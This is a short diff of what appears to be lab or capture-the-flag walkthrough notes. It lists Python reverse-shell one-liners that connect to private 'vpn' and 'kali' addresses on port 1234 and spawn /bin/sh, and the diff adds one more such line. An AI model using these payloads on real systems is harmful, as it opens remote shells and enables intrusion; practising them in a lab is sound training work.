@@ -408,7 +408,7 @@ Feel free to ask further questions or for deeper elaboration on any specific par
 walkthrough uses a reverse shell cheat sheet online
 import socket,os,pty;s=socket.socket();s.connect(("192.168.145.103",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh") #vpn ip
 import socket,os,pty;s=socket.socket();s.connect(("192.168.241.128",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh") #kali ip
-[Errno 111] Connection refused
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.241.128",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])
 [Errno 110] Connection timed out
 
 user
